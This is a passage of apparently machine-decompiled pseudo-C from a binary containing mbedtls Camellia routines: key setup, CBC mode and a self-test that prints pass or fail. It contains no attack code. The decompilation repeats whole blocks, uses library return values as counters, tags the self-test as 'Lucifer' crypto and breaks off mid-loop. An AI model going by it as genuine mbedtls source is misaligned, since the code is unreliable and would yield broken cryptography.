            v29 = &v27;
            // branch -> 0x806edd8
            while (true) {
                // 0x806edd8
                set_mem = (int32_t)memset((char *)v29, (int32_t)&v24, 16);
                v46 = v8;
                v68 = 4 * set_mem;
                v64 = *(char *)(v68 + v46);
                v77 = *(char *)((v68 | 1) + v46);
                v78 = *(char *)((v68 | 3) + v46);
                v79 = *(char *)((v68 | 2) + v46);
                v67 = 256 * (int32_t)v79;
                v47 = v67 | 0x10000 * (int32_t)v77 | 0x1000000 * (int32_t)v64 | (int32_t)v78;
                *(int32_t *)(v68 - 188 + v3) = v47;
                v12 = set_mem + 1;
                if (v12 != 8) {
                    goto lab_0x806edd8_5;
                }
                // 0x806ee09
                v30 = v3;
                v48 = v30 - 188;
                g3 = v48;
                v49 = v48;
                v65 = *(int32_t *)(v49 + 16);
                *(int32_t *)(v49 + 32) = *(int32_t *)v49 ^ v65;
                v13 = g3 + 4;
                g3 = v13;
                // branch -> 0x806ee15
                while (v13 != v30 - 172) {
                    // 0x806ee15
                    v49 = v13;
                    v65 = *(int32_t *)(v49 + 16);
                    *(int32_t *)(v49 + 32) = *(int32_t *)v49 ^ v65;
                    v13 = g3 + 4;
                    g3 = v13;
                    // continue -> 0x806ee15
                }
                // 0x806ee24
                v31 = v3;
                v50 = v31 - 156;
                g5 = v50;
                g4 = v31 - 148;
                g1 = v50;
                camellia_feistel(v1, a2, a3);
                v51 = g2;
                g6 = v51 - 52;
                g4 = g5;
                g1 = v51 - 148;
                camellia_feistel(v1, a2, a3);
                v32 = g2;
                g6 = v32 - 44;
                v17 = (int32_t *)(v32 - 156);
                *v17 = *v17 ^ *(int32_t *)(v32 - 188);
                v33 = g2;
                g4 = v33 - 148;
                v18 = (int32_t *)(v33 - 152);
                *v18 = *v18 ^ *(int32_t *)(v33 - 184);
                v34 = g2;
                v19 = (int32_t *)(v34 - 148);
                *v19 = *v19 ^ *(int32_t *)(v34 - 180);
                v35 = g2;
                v20 = (int32_t *)(v35 - 144);
                *v20 = *v20 ^ *(int32_t *)(v35 - 176);
                g1 = g5;
                camellia_feistel(v1, a2, a3);
                v52 = g2;
                g6 = v52 - 36;
                g4 = g5;
                g1 = v52 - 148;
                camellia_feistel(v1, a2, a3);
                v53 = g2;
                v37 = v53;
                if (*(int32_t *)(v53 + 16) >= 129) {
                    // 0x806eea0
                    v54 = g3;
                    v66 = *(int32_t *)(v54 + 16);
                    *(int32_t *)(v54 + 32) = *(int32_t *)v54 ^ v66;
                    v14 = g3 + 4;
                    g3 = v14;
                    // branch -> 0x806eea9
                    while (v14 != v53 - 156) {
                        // 0x806eea9
                        v54 = v14;
                        v66 = *(int32_t *)(v54 + 16);
                        *(int32_t *)(v54 + 32) = *(int32_t *)v54 ^ v66;
                        v14 = g3 + 4;
                        g3 = v14;
                        // continue -> 0x806eea9
                    }
                    // 0x806eeb8
                    v36 = g2;
                    v55 = v36 - 132;
                    g5 = v55;
                    v56 = v36 - 140;
                    g3 = v56;
                    g4 = v55;
                    g6 = v36 - 28;
                    g1 = v56;
                    camellia_feistel(v1, a2, a3);
                    g6 = g2 - 20;
                    g4 = g3;
                    g1 = g5;
                    camellia_feistel(v1, a2, a3);
                    v37 = g2;
                    // branch -> 0x806eedc
                }
                // 0x806eedc
                v23 = 15;
                *(int32_t *)(v37 - 292) = g7;
                *(int32_t *)(g2 - 268) = *(int32_t *)(v37 - 188);
                v38 = g2;
                *(int32_t *)(v38 - 264) = *(int32_t *)(v38 - 184);
                v39 = g2;
                *(int32_t *)(v39 - 260) = *(int32_t *)(v39 - 180);
                v40 = g2;
                *(int32_t *)(v40 - 256) = *(int32_t *)(v40 - 176);
                v41 = g2;
                v59 = *(int32_t *)(v41 - 284);
                *(int32_t *)(v41 - 272) = 16 * v59 + (int32_t)&g175;
                v42 = g2;
                v57 = v42 - 268;
                v22 = v57;
                *(int32_t *)(v42 - 296) = v57;
                v9 = v22;
                // branch -> 0x806ef39
                while (true) {
                    // 0x806ef39
                    v43 = g2;
                    if (*(char *)*(int32_t *)(v43 - 272) == 0) {
                        v44 = v43;
                        goto lab_0x806efe9_5;
                    }
                    goto lab_0x806ef48_5;
                }
            }
        }
    }
    // 0x806f4d0
    *(int32_t *)g7 = 4;
    // branch -> 0x806ed2e
    // 0x806ed2e
    v60 = 0;
    v61 = *(char *)(v9 + v60);
    *(char *)(v8 + v60) = v61;
    v10 = 1;
    // branch -> 0x806ed30
    while (a3 / 8 > v10) {
        // 0x806ed30
        v60 = v10;
        v61 = *(char *)(v9 + v60);
        *(char *)(v8 + v60) = v61;
        v10++;
        // continue -> 0x806ed30
    }
    // 0x806ed3e
    if (a3 == 192) {
        // 0x806f4eb
        v21 = &v26;
        v58 = v21;
        v45 = *(char *)v58;
        *(char *)(v58 + 8) = (char)(-1 - (int32_t)v45);
        v15 = v21 + 1;
        // branch -> 0x806f4f8
        while (v15 != (int32_t)&v25) {
            // 0x806f4f8
            v58 = v15;
            v45 = *(char *)v58;
            *(char *)(v58 + 8) = (char)(-1 - (int32_t)v45);
            v15++;
            // continue -> 0x806f4f8
        }
        // 0x806ed4b
        v22 = 0;
        v16 = &v28;
        g6 = v16;
        // branch -> 0x806ed50
        while (true) {
            // 0x806ed50
            v62 = 0;
            v69 = *(char *)(v62 + (int32_t)&g167);
            v70 = *(char *)(v62 + (int32_t)&g168);
            v71 = *(char *)(v62 + (int32_t)&g170);
            v72 = *(char *)(v62 + (int32_t)&g169);
            v73 = *(char *)(v62 + (int32_t)&g172);
            *(int32_t *)(v62 + v16) = 256 * (int32_t)v72 | 0x10000 * (int32_t)v70 | 0x1000000 * (int32_t)v69 | (int32_t)v71;
            v63 = 8 * v22;
            v74 = *(char *)(v63 + (int32_t)&g171);
            v75 = *(char *)(v63 + (int32_t)&g174);
            v76 = *(char *)(v63 + (int32_t)&g173);
            *(int32_t *)((v63 | 4) + g6) = 256 * (int32_t)v76 | 0x1000000 * (int32_t)v74 | 0x10000 * (int32_t)v73 | (int32_t)v75;
            v11 = v22 + 1;
            v22 = v11;
            if (v11 != 6) {
                goto lab_0x806ed50_5;
            }
            // 0x806edbd
            v29 = &v27;
            // branch -> 0x806edd8
            while (true) {
                // 0x806edd8
                set_mem = (int32_t)memset((char *)v29, (int32_t)&v24, 16);
                v46 = v8;
                v68 = 4 * set_mem;
                v64 = *(char *)(v68 + v46);
                v77 = *(char *)((v68 | 1) + v46);
                v78 = *(char *)((v68 | 3) + v46);
                v79 = *(char *)((v68 | 2) + v46);
                v67 = 256 * (int32_t)v79;
                v47 = v67 | 0x10000 * (int32_t)v77 | 0x1000000 * (int32_t)v64 | (int32_t)v78;
                *(int32_t *)(v68 - 188 + v3) = v47;
                v12 = set_mem + 1;
                if (v12 != 8) {
                    goto lab_0x806edd8_5;
                }
                // 0x806ee09
                v30 = v3;
                v48 = v30 - 188;
                g3 = v48;
                v49 = v48;
                v65 = *(int32_t *)(v49 + 16);
                *(int32_t *)(v49 + 32) = *(int32_t *)v49 ^ v65;
                v13 = g3 + 4;
                g3 = v13;
                // branch -> 0x806ee15
                while (v13 != v30 - 172) {
                    // 0x806ee15
                    v49 = v13;
                    v65 = *(int32_t *)(v49 + 16);
                    *(int32_t *)(v49 + 32) = *(int32_t *)v49 ^ v65;
                    v13 = g3 + 4;
                    g3 = v13;
                    // continue -> 0x806ee15
                }
                // 0x806ee24
                v31 = v3;
                v50 = v31 - 156;
                g5 = v50;
                g4 = v31 - 148;
                g1 = v50;
                camellia_feistel(v1, a2, a3);
                v51 = g2;
                g6 = v51 - 52;
                g4 = g5;
                g1 = v51 - 148;
                camellia_feistel(v1, a2, a3);
                v32 = g2;
                g6 = v32 - 44;
                v17 = (int32_t *)(v32 - 156);
                *v17 = *v17 ^ *(int32_t *)(v32 - 188);
                v33 = g2;
                g4 = v33 - 148;
                v18 = (int32_t *)(v33 - 152);
                *v18 = *v18 ^ *(int32_t *)(v33 - 184);
                v34 = g2;
                v19 = (int32_t *)(v34 - 148);
                *v19 = *v19 ^ *(int32_t *)(v34 - 180);
                v35 = g2;
                v20 = (int32_t *)(v35 - 144);
                *v20 = *v20 ^ *(int32_t *)(v35 - 176);
                g1 = g5;
                camellia_feistel(v1, a2, a3);
                v52 = g2;
                g6 = v52 - 36;
                g4 = g5;
                g1 = v52 - 148;
                camellia_feistel(v1, a2, a3);
                v53 = g2;
                v37 = v53;
                if (*(int32_t *)(v53 + 16) >= 129) {
                    // 0x806eea0
                    v54 = g3;
                    v66 = *(int32_t *)(v54 + 16);
                    *(int32_t *)(v54 + 32) = *(int32_t *)v54 ^ v66;
                    v14 = g3 + 4;
                    g3 = v14;
                    // branch -> 0x806eea9
                    while (v14 != v53 - 156) {
                        // 0x806eea9
                        v54 = v14;
                        v66 = *(int32_t *)(v54 + 16);
                        *(int32_t *)(v54 + 32) = *(int32_t *)v54 ^ v66;
                        v14 = g3 + 4;
                        g3 = v14;
                        // continue -> 0x806eea9
                    }
                    // 0x806eeb8
                    v36 = g2;
                    v55 = v36 - 132;
                    g5 = v55;
                    v56 = v36 - 140;
                    g3 = v56;
                    g4 = v55;
                    g6 = v36 - 28;
                    g1 = v56;
                    camellia_feistel(v1, a2, a3);
                    g6 = g2 - 20;
                    g4 = g3;
                    g1 = g5;
                    camellia_feistel(v1, a2, a3);
                    v37 = g2;
                    // branch -> 0x806eedc
                }
                // 0x806eedc
                v23 = 15;
                *(int32_t *)(v37 - 292) = g7;
                *(int32_t *)(g2 - 268) = *(int32_t *)(v37 - 188);
                v38 = g2;
                *(int32_t *)(v38 - 264) = *(int32_t *)(v38 - 184);
                v39 = g2;
                *(int32_t *)(v39 - 260) = *(int32_t *)(v39 - 180);
                v40 = g2;
                *(int32_t *)(v40 - 256) = *(int32_t *)(v40 - 176);
                v41 = g2;
                v59 = *(int32_t *)(v41 - 284);
                *(int32_t *)(v41 - 272) = 16 * v59 + (int32_t)&g175;
                v42 = g2;
                v57 = v42 - 268;
                v22 = v57;
                *(int32_t *)(v42 - 296) = v57;
                v9 = v22;
                // branch -> 0x806ef39
                while (true) {
                    // 0x806ef39
                    v43 = g2;
                    if (*(char *)*(int32_t *)(v43 - 272) == 0) {
                        v44 = v43;
                        goto lab_0x806efe9_5;
                    }
                    goto lab_0x806ef48_5;
                }
            }
        }
    }
    // 0x806ed4b
    v22 = 0;
    v16 = &v28;
    g6 = v16;
    // branch -> 0x806ed50
    while (true) {
        // 0x806ed50
        v62 = 0;
        v69 = *(char *)(v62 + (int32_t)&g167);
        v70 = *(char *)(v62 + (int32_t)&g168);
        v71 = *(char *)(v62 + (int32_t)&g170);
        v72 = *(char *)(v62 + (int32_t)&g169);
        v73 = *(char *)(v62 + (int32_t)&g172);
        *(int32_t *)(v62 + v16) = 256 * (int32_t)v72 | 0x10000 * (int32_t)v70 | 0x1000000 * (int32_t)v69 | (int32_t)v71;
        v63 = 8 * v22;
        v74 = *(char *)(v63 + (int32_t)&g171);
        v75 = *(char *)(v63 + (int32_t)&g174);
        v76 = *(char *)(v63 + (int32_t)&g173);
        *(int32_t *)((v63 | 4) + g6) = 256 * (int32_t)v76 | 0x1000000 * (int32_t)v74 | 0x10000 * (int32_t)v73 | (int32_t)v75;
        v11 = v22 + 1;
        v22 = v11;
        if (v11 != 6) {
            goto lab_0x806ed50_5;
        }
        // 0x806edbd
        v29 = &v27;
        // branch -> 0x806edd8
        while (true) {
            // 0x806edd8
            set_mem = (int32_t)memset((char *)v29, (int32_t)&v24, 16);
            v46 = v8;
            v68 = 4 * set_mem;
            v64 = *(char *)(v68 + v46);
            v77 = *(char *)((v68 | 1) + v46);
            v78 = *(char *)((v68 | 3) + v46);
            v79 = *(char *)((v68 | 2) + v46);
            v67 = 256 * (int32_t)v79;
            v47 = v67 | 0x10000 * (int32_t)v77 | 0x1000000 * (int32_t)v64 | (int32_t)v78;
            *(int32_t *)(v68 - 188 + v3) = v47;
            v12 = set_mem + 1;
            if (v12 != 8) {
                goto lab_0x806edd8_5;
            }
            // 0x806ee09
            v30 = v3;
            v48 = v30 - 188;
            g3 = v48;
            v49 = v48;
            v65 = *(int32_t *)(v49 + 16);
            *(int32_t *)(v49 + 32) = *(int32_t *)v49 ^ v65;
            v13 = g3 + 4;
            g3 = v13;
            // branch -> 0x806ee15
            while (v13 != v30 - 172) {
                // 0x806ee15
                v49 = v13;
                v65 = *(int32_t *)(v49 + 16);
                *(int32_t *)(v49 + 32) = *(int32_t *)v49 ^ v65;
                v13 = g3 + 4;
                g3 = v13;
                // continue -> 0x806ee15
            }
            // 0x806ee24
            v31 = v3;
            v50 = v31 - 156;
            g5 = v50;
            g4 = v31 - 148;
            g1 = v50;
            camellia_feistel(v1, a2, a3);
            v51 = g2;
            g6 = v51 - 52;
            g4 = g5;
            g1 = v51 - 148;
            camellia_feistel(v1, a2, a3);
            v32 = g2;
            g6 = v32 - 44;
            v17 = (int32_t *)(v32 - 156);
            *v17 = *v17 ^ *(int32_t *)(v32 - 188);
            v33 = g2;
            g4 = v33 - 148;
            v18 = (int32_t *)(v33 - 152);
            *v18 = *v18 ^ *(int32_t *)(v33 - 184);
            v34 = g2;
            v19 = (int32_t *)(v34 - 148);
            *v19 = *v19 ^ *(int32_t *)(v34 - 180);
            v35 = g2;
            v20 = (int32_t *)(v35 - 144);
            *v20 = *v20 ^ *(int32_t *)(v35 - 176);
            g1 = g5;
            camellia_feistel(v1, a2, a3);
            v52 = g2;
            g6 = v52 - 36;
            g4 = g5;
            g1 = v52 - 148;
            camellia_feistel(v1, a2, a3);
            v53 = g2;
            v37 = v53;
            if (*(int32_t *)(v53 + 16) >= 129) {
                // 0x806eea0
                v54 = g3;
                v66 = *(int32_t *)(v54 + 16);
                *(int32_t *)(v54 + 32) = *(int32_t *)v54 ^ v66;
                v14 = g3 + 4;
                g3 = v14;
                // branch -> 0x806eea9
                while (v14 != v53 - 156) {
                    // 0x806eea9
                    v54 = v14;
                    v66 = *(int32_t *)(v54 + 16);
                    *(int32_t *)(v54 + 32) = *(int32_t *)v54 ^ v66;
                    v14 = g3 + 4;
                    g3 = v14;
                    // continue -> 0x806eea9
                }
                // 0x806eeb8
                v36 = g2;
                v55 = v36 - 132;
                g5 = v55;
                v56 = v36 - 140;
                g3 = v56;
                g4 = v55;
                g6 = v36 - 28;
                g1 = v56;
                camellia_feistel(v1, a2, a3);
                g6 = g2 - 20;
                g4 = g3;
                g1 = g5;
                camellia_feistel(v1, a2, a3);
                v37 = g2;
                // branch -> 0x806eedc
            }
            // 0x806eedc
            v23 = 15;
            *(int32_t *)(v37 - 292) = g7;
            *(int32_t *)(g2 - 268) = *(int32_t *)(v37 - 188);
            v38 = g2;
            *(int32_t *)(v38 - 264) = *(int32_t *)(v38 - 184);
            v39 = g2;
            *(int32_t *)(v39 - 260) = *(int32_t *)(v39 - 180);
            v40 = g2;
            *(int32_t *)(v40 - 256) = *(int32_t *)(v40 - 176);
            v41 = g2;
            v59 = *(int32_t *)(v41 - 284);
            *(int32_t *)(v41 - 272) = 16 * v59 + (int32_t)&g175;
            v42 = g2;
            v57 = v42 - 268;
            v22 = v57;
            *(int32_t *)(v42 - 296) = v57;
            v9 = v22;
            // branch -> 0x806ef39
            while (true) {
                // 0x806ef39
                v43 = g2;
                if (*(char *)*(int32_t *)(v43 - 272) == 0) {
                    v44 = v43;
                    goto lab_0x806efe9_5;
                }
                goto lab_0x806ef48_5;
            }
        }
    }
}

// Address range: 0x806f510 - 0x806f52f
int32_t mbedtls_camellia_init(char * a1) {
    // 0x806f510
    memset(a1, 0, 69);
    return 0;
}

// Address range: 0x806f530 - 0x806f63c
int32_t mbedtls_camellia_setkey_dec(int32_t * a1, int32_t a2, int32_t a3) {
    int32_t v1 = g7; // 0x806f534
    int32_t v2 = g3; // bp-16
    int32_t v3 = &v2; // 0x806f535_0
    g7 = (int32_t)a1;
    int32_t v4;
    g3 = &v4;
    mbedtls_camellia_init((char *)&v4);
    int32_t v5;
    int32_t v6;
    int32_t v7;
    int32_t v8;
    int32_t result = mbedtls_camellia_setkey_enc((int32_t *)g3, a2, a3, v8, v7, v6, v5, 0); // 0x806f55e
    int32_t v9; // 0x806f62b
    if (result == 0) {
        *(int32_t *)g7 = v4;
        int32_t v10 = v4 == 4; // 0x806f57b
        int32_t v11 = 64 * v10; // 0x806f57b
        int32_t v12 = v11 - 92 + g2; // 0x806f581
        int32_t v13 = v12; // edx
        int32_t v14 = 8 * v10 + 22; // 0x806f593
        *(int32_t *)(g7 + 4) = *(int32_t *)v12;
        *(int32_t *)(g7 + 8) = *(int32_t *)(v13 + 4);
        *(int32_t *)(g7 + 12) = *(int32_t *)(v13 + 8);
        int32_t v15 = v13; // 0x806f5ab
        *(int32_t *)(g7 + 16) = *(int32_t *)(v15 + 12);
        int32_t v16 = g7 + 20; // 0x806f5ba
        int32_t v17 = v15 - 8; // 0x806f5c5
        v13 = v16;
        int32_t v18 = v14; // esi
        int32_t v19 = v16; // 0x806f5d2
        // branch -> 0x806f5d0
        while (true) {
            // 0x806f5d0
            *(int32_t *)v19 = *(int32_t *)v17;
            int32_t v20 = v17; // 0x806f5d4
            v17 = v20 - 8;
            *(int32_t *)(v13 + 4) = *(int32_t *)(v20 + 4);
            int32_t v21 = v13 + 8; // 0x806f5dd
            v13 = v21;
            int32_t v22 = v18 - 1; // 0x806f5e0
            v18 = v22;
            if (v22 == 0) {
                int32_t v23 = v16 + 8 * v14; // 0x806f5f1
                v13 = v23;
                int32_t v24 = v15 + -184 - v11; // 0x806f605
                v17 = v24;
                *(int32_t *)v23 = *(int32_t *)(v24 - 8);
                *(int32_t *)(v13 + 4) = *(int32_t *)(v17 - 4);
                *(int32_t *)(v13 + 8) = *(int32_t *)v17;
                *(int32_t *)(v13 + 12) = *(int32_t *)(v17 + 4);
                // branch -> 0x806f622
                // 0x806f622
                *(char *)g3 = 0;
                v9 = g3 + 1;
                g3 = v9;
                // branch -> 0x806f628
                while (v9 != v3) {
                    // 0x806f628
                    *(char *)v9 = 0;
                    v9 = g3 + 1;
                    g3 = v9;
                    // continue -> 0x806f628
                }
                // 0x806f632
                g3 = v2;
                g7 = v1;
                return result;
            }
            // 0x806f5d0
            v19 = v21;
            // branch -> 0x806f5d0
        }
    }
    // 0x806f622
    *(char *)g3 = 0;
    v9 = g3 + 1;
    g3 = v9;
    // branch -> 0x806f628
    while (v9 != v3) {
        // 0x806f628
        *(char *)v9 = 0;
        v9 = g3 + 1;
        g3 = v9;
        // continue -> 0x806f628
    }
    // 0x806f632
    g3 = v2;
    g7 = v1;
    return result;
}

// Address range: 0x806f63d - 0x806f63f
int32_t function_806f63d(int32_t a1) {
    // 0x806f63d
    return g7;
}

// Address range: 0x806f640 - 0x806f75f
int32_t mbedtls_camellia_crypt_cbc(int32_t a1, int32_t a2, char a3, int32_t * a4, int32_t a5, int32_t a6) {
    int32_t v1 = g5; // 0x806f648
    int32_t v2 = g7; // 0x806f649
    int32_t v3 = g3; // 0x806f64a
    g3 = (int32_t)a4;
    int32_t v4 = a3;
    if (a3 == 15) {
        // 0x806f65b
        if (a2 == 0) {
            // 0x806f671
            int32_t v5;
            g5 = &v5;
            int32_t v6 = 0; // 0x806f69f
            // branch -> 0x806f678
            while (true) {
                int32_t v7 = v6 + a5; // 0x806f67e
                g7 = v6 + a6;
                v5 = *(int32_t *)v7;
                mbedtls_camellia_crypt_ecb((int32_t *)a1, 0, (char *)v7);
                int32_t v8 = 0; // 0x806f6c4
                char * v9 = (char *)(g7 + v8); // 0x806f6c4_0
                *v9 = *v9 ^ *(char *)(g3 + v8);
                int32_t v10 = 1; // 0x806f6c7
                // branch -> 0x806f6c0
                while (v10 != 16) {
                    // 0x806f6c0
                    v8 = v10;
                    v9 = (char *)(g7 + v8);
                    *v9 = *v9 ^ *(char *)(g3 + v8);
                    v10++;
                    // continue -> 0x806f6c0
                }
                // 0x806f6cf
                *(int32_t *)g3 = v5;
                *(int32_t *)(g3 + 4) = *(int32_t *)(v7 + 4);
                *(int32_t *)(g3 + 8) = *(int32_t *)(v7 + 8);
                *(int32_t *)(g3 + 12) = *(int32_t *)(v7 + 12);
                int32_t v11 = v6 + 16; // 0x806f6e8
                if (v4 == v11) {
                    // 0x806f6ed
                    // branch -> 0x806f6ef
                    // 0x806f6ef
                    g3 = v3;
                    g7 = v2;
                    g5 = v1;
                    return 0;
                }
                // 0x806f6cf
                v6 = v11;
                // branch -> 0x806f678
            }
        } else {
            // 0x806f700
            g5 = 0;
            int32_t v12 = 0; // 0x806f70a
            // branch -> 0x806f700
          lab_0x806f700:
            while (true) {
                int32_t v13 = 0; // eax
                int32_t v14 = v12 + a5; // 0x806f708
                int32_t v15 = v12 + a6; // 0x806f70a
                g7 = v15;
                int32_t v16 = 0; // 0x806f717
                // branch -> 0x806f710
                while (true) {
                    char v17 = *(char *)(g3 + v16); // 0x806f710
                    char v18 = *(char *)(v16 + v14); // 0x806f714
                    *(char *)(v16 + v15) = v18 ^ v17;
                    int32_t v19 = v13 + 1; // 0x806f71a
                    v13 = v19;
                    if (v19 == 16) {
                        // 0x806f722
                        g5 += 16;
                        mbedtls_camellia_crypt_ecb((int32_t *)a1, a2, (char *)g7);
                        *(int32_t *)g3 = *(int32_t *)g7;
                        *(int32_t *)(g3 + 4) = *(int32_t *)(g7 + 4);
                        *(int32_t *)(g3 + 8) = *(int32_t *)(g7 + 8);
                        *(int32_t *)(g3 + 12) = *(int32_t *)(g7 + 12);
                        int32_t v20 = g5; // 0x806f755
                        if (v4 == v20) {
                            // break (via goto) -> 0x806f75a
                            goto lab_0x806f75a;
                        }
                        v12 = v20;
                        // continue (via goto) -> 0x806f700
                        goto lab_0x806f700;
                    } else {
                        // 0x806f710
                        v15 = g7;
                        v16 = v19;
                        // branch -> 0x806f710
                        continue;
                    }
                }
              lab_0x806f75a:
                // 0x806f75a
                // branch -> 0x806f6ef
                // 0x806f6ef
                g3 = v3;
                g7 = v2;
                g5 = v1;
                return 0;
            }
        }
    }
    // 0x806f6ef
    g3 = v3;
    g7 = v2;
    g5 = v1;
    return -38;
}

// Address range: 0x806f760 - 0x806febe
// Used cryptographic patterns:
//  - Lucifer__outerbridge__DFLTKY (8-bit, little endian)
int32_t mbedtls_camellia_self_test(int32_t a1) {
    int32_t v1;
    int32_t v2 = &v1; // 0x806f760_0
    int32_t v3 = g5; // 0x806f765
    int32_t v4 = g7; // 0x806f766
    int32_t v5 = g3; // 0x806f767
    *(int32_t *)(v2 - 140) = 0;
    int32_t v6 = 4; // 0x806f779186
    int32_t v7; // 0x806f784_0
    int32_t v8; // 0x806f844_0
    int32_t v9; // 0x806f903_0
    int32_t v10;
    int32_t str;
    int32_t v11;
    int32_t v12;
    char * v13;
    int32_t v14; // 0x806f7f9
    int32_t v15; // 0x806f7b8
    int32_t v16; // 0x806f80b
    int32_t v17; // 0x806f7ac
    int32_t v18; // 0x806f7ba
    if (v6 < 32) {
        *(int32_t *)(v6 - 140 + v2) = 0;
        int32_t v19 = v6 + 4; // 0x806f779
        while (v19 < 32) {
            // 0x806f76e
            *(int32_t *)(v19 - 140 + v2) = 0;
            v19 += 4;
            // continue -> 0x806f76e
        }
        // 0x806f781
        v7 = &str;
        v9 = &v10;
        v8 = &v11;
        v13 = (char *)v12;
        // branch -> 0x806f7a0
        int32_t v20;
        int32_t v21;
        int32_t v22;
        int32_t v23;
        int32_t str2;
        for (uint32_t i = 0; i < 6; i++) {
            // 0x806f7a0
            v17 = i % 2;
            v15 = i / 2;
            v18 = v15 + 2;
            v14 = v15;
            v16 = v18;
            if (a1 != 0) {
              lab_0x806f7c1:;
                int32_t v24 = (int32_t)"enc"; // 0x806f7e0
                if (v17 == 0) {
                    // if_806f7dd_0_true
                    v24 = (int32_t)"dec";
                    // branch -> after_if_806f7dd_0
                }
                // after_if_806f7dd_0
                printf("  CAMELLIA-ECB-%3d (%s): ", v24, v13);
                v14 = v15;
                v16 = v18;
                // branch -> 0x806f7f2
            }
          lab_0x806f7f2:
            // 0x806f7f2
            g3 = (int32_t)"\x01\x23\x45\x67\x89\xab\xcd\xef\xfe\xdc\xba\x98\x76\x54\x32\x10";
            int32_t v25 = 64 * v16; // 0x806f80b
            g7 = v25;
            int32_t v26 = 32 * v14 + (int32_t)&g159; // 0x806f935
            int32_t v27 = 64 * v14 + (int32_t)"\x01\x23\x45\x67\x89\xab\xcd\xef\xfe\xdc\xba\x98\x76\x54\x32\x10";
            char * v28 = v13;
            // branch -> 0x806f8ed
            while (true) {
                // 0x806f8ed
                memcpy((char *)&v10, (char *)v27, 8 * v16);
                g5 = v17;
                int32_t v29;
                if (v17 == 0) {
                    // 0x806f830
                    mbedtls_camellia_setkey_dec(&v11, v9, v25);
                    v20 = *(int32_t *)v26;
                    v29 = g3;
                    // branch -> 0x806f886
                } else {
                    // 0x806f929
                    mbedtls_camellia_setkey_enc(&v11, v9, v25, (int32_t)v28, v23, v22, v21, 0);
                    v20 = *(int32_t *)g3;
                    v29 = v26;
                    // branch -> 0x806f886
                }
                // 0x806f886
                str2 = *(int32_t *)v29;
                mbedtls_camellia_crypt_ecb(&v11, v17, (char *)&v20);
                g7 = v7;
                uint32_t strncmp_rc = strncmp((char *)&str, (char *)&str2, 16);
                g237 = strncmp_rc % 2 == 0;
                if (strncmp_rc % 2 == 0) {
                    int32_t v30 = g3 + 16; // 0x806f8d4
                    g3 = v30;
                    int32_t v31 = v26 + 16; // 0x806f8d7
                    int32_t v32 = v27 + 32; // 0x806f8da
                    if (v30 == 0x807fdc0) {
                        // break -> 0x806f9b0
                        break;
                    }
                    v26 = v31;
                    v27 = v32;
                    v28 = (char *)&str;
                    // continue -> 0x806f8ed
                    continue;
                }
                // 0x806f990
                g1 = 1;
                if (a1 == 0) {
                    // 0x806f9a0
                    g3 = v5;
                    g7 = v4;
                    g5 = v3;
                    return 1;
                }
                // 0x806fc10
                puts("failed");
                g1 = 1;
                g3 = v5;
                g7 = v4;
                g5 = v3;
                return 1;
            }
            // 0x806f9b0
            if (a1 != 0) {
                // 0x806fe50
                puts("passed");
                // branch -> 0x806f9bb
            }
            // 0x806f9bb
            // PHI copies at the loop end
            v13 = (char *)&str;
            // loop 0x806f7a0 end
        }
        int32_t v33 = &v20;
        if (a1 != 0) {
            // 0x806fe61
            putchar(10);
            // branch -> 0x806f9e4
        }
        char * v34 = (char *)&str;
        // branch -> 0x806f9e4
        int32_t v35;
        for (uint32_t i = 0; i < 6; i++) {
            int32_t v36 = i / 2; // 0x806f9f3
            int32_t v37 = i % 2; // 0x806f9f3
            g3 = v36;
            int32_t v38 = v36 + 2; // 0x806fa00
            if (a1 != 0) {
                int32_t v39 = (int32_t)"enc"; // 0x806fa24
                if (v37 == 0) {
                    // if_806fa21_0_true
                    v39 = (int32_t)"dec";
                    // branch -> after_if_806fa21_0
                }
                // after_if_806fa21_0
                printf("  CAMELLIA-CBC-%3d (%s): ", v39, v34);
                v36 = g3;
                // branch -> 0x806fa36
            }
            // 0x806fa36
            v20 = 0x3020100;
            str2 = 0x3020100;
            memcpy((char *)&v10, (char *)(32 * v36 + (int32_t)&g160), 8 * v38);
            g5 = v37;
            int32_t v40 = 64 * v38; // 0x806fab0
            g7 = v40;
            if (v37 == 0) {
                // 0x806fab0
                mbedtls_camellia_setkey_dec(&v11, v9, v40);
                // branch -> 0x806facf
            } else {
                // 0x806fe28
                mbedtls_camellia_setkey_enc(&v11, v9, v40, (int32_t)v34, v23, v22, v21, 0);
                // branch -> 0x806facf
            }
            int32_t v41 = g3; // 0x806facf
            g3 = &g162;
            int32_t v42 = 48 * v41 + (int32_t)&g161; // 0x806fada
            int32_t v43 = &g162; // 0x806fb1f
            // branch -> 0x806fbac
            while (true) {
                // 0x806fbac
                int32_t v44;
                int32_t v45;
                int32_t v46;
                if (v37 == 0) {
                    // 0x806faf0
                    v45 = v20;
                    v44 = v42;
                    v46 = v43;
                    // branch -> 0x806fb36
                } else {
                    // 0x806fbba
                    v45 = str2;
                    v44 = v43;
                    v46 = v42;
                    // branch -> 0x806fb36
                }
                // 0x806fb36
                v35 = v45;
                v20 = *(int32_t *)v44;
                str2 = *(int32_t *)v46;
                mbedtls_camellia_crypt_cbc(v8, v37, 16, &v35, v33, v7);
                g7 = v7;
                g5 = &str2;
                uint32_t strncmp_rc2 = strncmp((char *)&str, (char *)&str2, 16);
                g237 = strncmp_rc2 % 2 == 0;
                if (strncmp_rc2 % 2 == 0) {
                    int32_t v47 = g3 + 16; // 0x806fb93
                    g3 = v47;
                    int32_t v48 = v42 + 16; // 0x806fb99
                    if (v47 == 0x807ff10) {
                        // break -> 0x806fc30
                        break;
                    }
                    v42 = v48;
                    v43 = v47;
                    // continue -> 0x806fbac
                    continue;
                }
                // 0x806f990
                g1 = 1;
                if (a1 == 0) {
                    // 0x806f9a0
                    g3 = v5;
                    g7 = v4;
                    g5 = v3;
                    return 1;
                }
                // 0x806fc10
                puts("failed");
                g1 = 1;
                g3 = v5;
                g7 = v4;
                g5 = v3;
                return 1;
            }
            // 0x806fc30
            if (a1 != 0) {
                // 0x806fe72
                puts("passed");
                // branch -> 0x806fc3b
            }
            // 0x806fc3b
            // PHI copies at the loop end
            v22 = v7;
            v23 = v33;
            v34 = (char *)&v35;
            // loop 0x806f9e4 end
        }
        // 0x806fc4f
        if (a1 != 0) {
            int32_t putchar_rc = putchar(10); // 0x806feba
            g1 = putchar_rc;
            return putchar_rc;
        }
        // 0x806fd05
        int32_t v49;
        int32_t v50 = &v49; // 0x806fca5_0
        int32_t v51;
        int32_t v52 = &v51; // 0x806fcb3_0
        int32_t v53 = 0; // 0x806fd11
        char * v54 = NULL;
        char * v55 = (char *)&v35;
        // branch -> 0x806fd05
        while (true) {
            int32_t v56 = (int32_t)v54;
            g5 = v53;
